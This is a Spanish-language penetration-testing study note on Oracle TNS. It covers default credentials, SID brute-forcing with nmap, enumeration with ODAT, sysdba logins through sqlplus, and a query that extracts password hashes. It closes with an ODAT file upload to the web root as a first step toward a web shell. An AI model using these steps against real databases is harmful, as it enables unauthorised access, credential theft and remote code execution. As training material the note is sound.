# Oracle TNS

*Transparent Network Substrate*

Protocolo de comunicación de Oracle que conecta bases de datos y aplicaciones por la red (parte de Oracle Net Services). Soporta TCP/IP, IPX/SPX, cifrado SSL/TLS, resolución de nombres, balanceo de carga y gestión de conexiones. El **listener** TNS recibe las conexiones entrantes y las reenvía a la instancia de BBDD.

Puerto **1521 TCP** → Oracle TNS listener (por defecto)

## Configuración por defecto

Ficheros de config en `$ORACLE_HOME/network/admin`:
* `tnsnames.ora` → lado cliente, resuelve nombres de servicio a direcciones de red
* `listener.ora` → lado servidor, define qué servicios escucha el listener

**Credenciales por defecto** a recordar:
* Oracle 9 → `CHANGE_ON_INSTALL`
* Oracle 10 → sin contraseña por defecto
* servicio **DBSNMP** → contraseña `dbsnmp`

Gestión remota: posible en Oracle 8i/9i, no en 10g/11g.

## Setup de herramientas

**ODAT** (Oracle Database Attacking Tool) → herramienta de pentest en Python para enumerar y explotar Oracle (SQLi, RCE, privesc). Se instala desde GitHub (quentinhardy/odat).
**sqlplus** → cliente oficial para conectarse a la BBDD (`oracle-instantclient-sqlplus`).

## Footprinting

* Escaneo del puerto del listener
```bash
sudo nmap -p1521 -sV target --open
```

**SID** (System Identifier): nombre único que identifica una instancia de BBDD. El cliente lo necesita para conectar; si el SID es incorrecto, la conexión falla. Enumerar/adivinar el SID es el primer paso.

* Fuerza bruta del SID con Nmap
```bash
sudo nmap -p1521 -sV target --open --script oracle-sid-brute
```

* Enumeración completa con ODAT (saca versión, usuarios, SIDs, credenciales débiles...)
```bash
./odat.py all -s target
```

ODAT prueba credenciales conocidas; en el material encuentra `scott/tiger`.

## Interacción (sqlplus)

* Login normal (usuario/pass@IP/SID)
```bash
sqlplus scott/tiger@target/XE
```

* Login como administrador del sistema (más privilegios)
```bash
sqlplus scott/tiger@target/XE as sysdba
```

* Comandos útiles (en la shell `SQL>`)
```sql
select table_name from all_tables;        -- lista tablas
select * from user_role_privs;            -- privilegios del usuario actual
select name, password from sys.user$;     -- extrae hashes de contraseña (crackeable)
```

## Explotación: subir web shell

Si hay servidor web, se sube un archivo a la raíz web con ODAT (`utlfile`). Rutas por defecto:
* Linux → `/var/www/html`
* Windows → `C:\inetpub\wwwroot`
```bash
echo "test" > testing.txt
./odat.py utlfile -s target -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

Comprobar con 
```bash
curl http://target/testing.txt
```
Desde ahí se puede subir una web shell y lograr RCE.
